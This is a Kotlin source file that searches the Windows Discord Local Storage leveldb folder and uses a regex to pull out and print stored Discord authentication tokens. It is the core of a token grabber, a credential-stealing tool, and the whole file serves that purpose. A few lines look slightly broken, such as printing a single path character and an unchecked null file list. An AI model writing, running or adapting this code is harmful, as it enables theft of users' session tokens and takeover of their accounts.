import java.io.*
import java.nio.file.FileSystems
import java.util.regex.Pattern

fun main() {
    if (!(System.getProperty("os.name").contains("Windows"))) {
        println(System.getProperty("os.name"))
        return
    }
    val path = System.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"

    val pathnames: Array<String> // declare an empty array

    val f = File(path) // set file to the path
    pathnames = f.list() // list all the files in the path (because token is in one of the files)

    println("Searching: " + path[1] + FileSystems.getDefault().separator + pathnames);

    for (pathname in pathnames) { // iterate through all the files in the path
        val fstream = FileInputStream(File(path, pathname)) // for reading the file
        val inStream = DataInputStream(fstream) // for reading the file
        val br = BufferedReader(InputStreamReader(inStream)) // for reading the file
        var strLine: String? // make a new string
        while (br.readLine()
                .also { strLine = it } != null
        ) { // while the token has not been found, read the next line
            val p = Pattern.compile("\\w{24}\\.\\w{6}\\.\\w{27}") // regex pattern
            val m = p.matcher(strLine) // match the pattern to the contents of the file

            while (m.find()) { // every time a token is found
                println(m.group())
                println(m.group().toString())
            } // it
        }
        br.close() // Close the BufferedReader
    }
}